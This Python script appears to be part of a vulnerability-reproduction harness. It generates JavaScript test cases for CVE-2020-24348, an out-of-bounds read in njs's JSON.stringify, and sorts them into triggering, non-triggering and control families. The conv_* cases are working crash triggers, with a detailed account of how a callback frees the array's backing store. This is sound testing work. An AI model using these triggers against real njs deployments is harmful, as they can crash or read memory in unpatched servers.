"""Write the JavaScript case files for njs.cve-2020-24348 (JSON.stringify of a
fast array whose backing store is freed by a callback run during the
stringify iteration).

Usage: python3 jsonfast_cases.py OUTDIR

Writes OUTDIR/<case>.js and OUTDIR/cases.tsv with the columns case,
family, how (the mutation the callback performs, or "none"), slow (1 when
the array is a slow array when the OOB read would occur, 0 otherwise),
viol (1 when the case reaches the faulty state: the iterator reads the
freed backing store), absent (the key scripts/njs_cases.py uses for its
valid-output digest: "none" for a case that does not reach the faulty
state, "conv" for one that does).
Each script defines a printer (show() normalizes a value as
typeof:String(value); a thrown error as E:name) and prints one line; the
observable is JSON.stringify(array).

Mechanism under test (src/njs_json.c:njs_json_stringify_iterator at the
base commit c3da13fb):

The invariant the reported failure requires: when the array-state branch
of njs_json_stringify_iterator reads the next element with
`stringify->retval = njs_array_start(&state->value)[state->index++]`
(base line ~1296), the receiver must still be a fast array, so that
njs_array_start(&state->value) points to a live backing store of at least
state->length slots.  The iterator captures the array length when the
array state is pushed and reads elements from the backing store pointer.
A callback invoked while stringifying an element - an element object's
toJSON(), or a getter property read during that object's serialization -
can convert the receiving array from a fast array to a slow array:
njs_array_convert_to_slow_array() frees array->start and nulls it.  The
iterator then reads njs_array_start(&state->value)[state->index] from the
freed pointer, an out-of-bounds read (CWE-125), the reported failure
(SEGV / heap read in njs_json_stringify_iterator).

A fast array is converted to a slow array by:
  - an index assignment with index >= NJS_ARRAY_LARGE_OBJECT_LENGTH (32768);
  - a length set above 32768;
  - Object.freeze / Object.seal;
  - Object.defineProperty with an accessor or a non-default attribute on an
    element.
The callback must run while there is at least one element still to read
after it, so the converting element is placed before the last element.

Families (case name prefix):
  conv_*  a 4-element fast array whose element 1 converts it to a slow
          array during stringify; the faulty state.
            conv_idx     element.toJSON sets array[40000]=1 (index route,
                         the dataset PoC shape)
            conv_len     element.toJSON sets array.length=40000
            conv_defprop element.toJSON runs Object.defineProperty(array,
                         '3', {get:()=>9, configurable, enumerable})
            conv_getter  element is {get value(){ Object.defineProperty(
                         array,'3',{get:()=>9,...}) }} (the developer's
                         added unit-test route: a getter, not toJSON)
  keep_*  a 4-element fast array whose element 1 mutates an existing index
          (no resize, stays fast); no faulty state.
            keep_set0    element.toJSON sets array[0]=9 (already serialized)
            keep_set2    element.toJSON sets array[2]=9 (not yet serialized)

Revised 2026-10-28 after the first before run: conv_freeze was dropped
(Object.freeze does not free the backing store at this base, v0.4.3, so it
did not reach the faulty state: OK, not ASAN); keep_idxedge (array[32767]=9)
was replaced by keep_set2 because assigning index 32767 grows the array to
length 32768, which changes the loop bound and produced a wrong result (the
resize residual below, now covered by scripts/jsonfast_residual_cases.py),
not a clean keep. The earlier 12-case before run is kept under
logs/njs.cve-2020-24348/variants_run1/.
  pre_*   the array is already a slow array before the stringify; no faulty
          state (the slow-path read is taken throughout).
            pre_idx      array[40000]=1 is set before JSON.stringify
  ctl_*   no conversion.
            ctl_plain    JSON.stringify of a plain 4-number array
            ctl_tojson   an element toJSON that returns a value, no mutation
            ctl_nested   a nested array/object, no mutation

The observable is JSON.stringify(array), bounded by the length captured at
the start of the array serialization (the growth from an index/length
conversion is not re-read), and deterministic across engines.  The
dataset PoC (/testcase/poc.js, run as the extra case "poc") discards its
result and is expected to end without a sanitizer report.
"""
import sys
from pathlib import Path

PRELUDE = r"""
function show(v) { return typeof v + ':' + String(v); }
function out(f) { var r; try { r = show(f()); } catch (e) { r = 'E:' + e.name; } console.log(r); }
"""

# case -> (family, how, slow, viol, body); body returns the observable.
CASES = {}


def add(name, family, how, slow, viol, body):
    CASES[name] = (family, how, slow, viol, "conv" if viol else "none", body)


# conv_*: a callback converts the fast array to a slow array during stringify.
# element 1 is the converter; elements 2 and 3 are read after it.
add("conv_idx", "conv", "toJSON array[40000]=1", 1, 1,
    "var a=[0,null,2,3]; a[1]={toJSON:function(){ a[40000]=1; return 'C'; }}; "
    "return JSON.stringify(a);")
add("conv_len", "conv", "toJSON array.length=40000", 1, 1,
    "var a=[0,null,2,3]; a[1]={toJSON:function(){ a.length=40000; return 'C'; }}; "
    "return JSON.stringify(a);")
add("conv_defprop", "conv", "toJSON defineProperty(a,3,{get})", 1, 1,
    "var a=[0,null,2,3]; a[1]={toJSON:function(){ "
    "Object.defineProperty(a,'3',{get:function(){return 9;},configurable:true,enumerable:true}); "
    "return 'C'; }}; return JSON.stringify(a);")
add("conv_getter", "conv", "getter defineProperty(a,3,{get})", 1, 1,
    "var a=[0,null,2,3]; a[1]={get value(){ "
    "Object.defineProperty(a,'3',{get:function(){return 9;},configurable:true,enumerable:true}); }}; "
    "return JSON.stringify(a);")

# keep_*: a callback mutates but the array stays fast.
add("keep_set0", "keep", "toJSON array[0]=9 (already serialized)", 0, 0,
    "var a=[0,null,2,3]; a[1]={toJSON:function(){ a[0]=9; return 'C'; }}; "
    "return JSON.stringify(a);")
add("keep_set2", "keep", "toJSON array[2]=9 (existing index, no resize)", 0, 0,
    "var a=[0,null,2,3]; a[1]={toJSON:function(){ a[2]=9; return 'C'; }}; "
    "return JSON.stringify(a);")

# pre_*: the array is already slow before the stringify.
add("pre_idx", "pre", "pre array[40000]=1", 1, 0,
    "var a=[0,1,2,3]; a[40000]=1; return JSON.stringify(a).length;")

# ctl_*: no conversion.
add("ctl_plain", "ctl", "none", 0, 0,
    "var a=[0,1,2,3]; return JSON.stringify(a);")
add("ctl_tojson", "ctl", "none", 0, 0,
    "var a=[0,null,2,3]; a[1]={toJSON:function(){ return 'C'; }}; return JSON.stringify(a);")
add("ctl_nested", "ctl", "none", 0, 0,
    "var a=[0,[1,2],{x:3},3]; return JSON.stringify(a);")


def main(outdir):
    out = Path(outdir)
    out.mkdir(parents=True, exist_ok=True)
    rows = ["\t".join(["case", "family", "how", "slow", "viol", "absent"])]
    for name in sorted(CASES):
        family, how, slow, viol, absent, body = CASES[name]
        (out / (name + ".js")).write_text(PRELUDE + "out(function() { " + body + " });\n")
        rows.append("\t".join([name, family, how, str(slow), str(viol), absent]))
    (out / "cases.tsv").write_text("\n".join(rows) + "\n")
    print(f"{len(CASES)} cases written to {outdir}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: python3 jsonfast_cases.py OUTDIR")
    main(sys.argv[1])
